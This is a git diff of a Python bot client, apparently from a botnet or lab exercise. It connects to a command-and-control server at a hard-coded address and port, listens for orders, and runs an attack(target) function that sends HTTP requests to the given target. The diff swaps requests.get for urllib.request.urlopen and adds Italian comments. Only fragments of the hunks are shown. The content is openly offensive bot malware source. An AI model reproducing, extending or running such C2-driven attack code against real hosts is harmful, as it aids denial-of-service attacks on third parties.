@@ -1,4 +1,5 @@
 import socket, time, os, requests
+import urllib.request
 
 CNC_IP = "10.10.10.100"
 CNC_PORT = 5002
@@ -29,8 +30,17 @@ def listen(sock):
             break
 
 def attack(target):
-    requests.get(f"http://{target}")
+        
+    url = f"http://{target}"
 
+    with urllib.request.urlopen(url) as response:
+        # Legge il contenuto della risposta
+        body = response.read().decode('utf-8')
+        
+        # Puoi anche accedere allo status code e agli header
+        status_code = response.getcode()
+        
+        print(f"Status Code: {status_code}")
 
 while True:
     sock = connect_to_cnc()
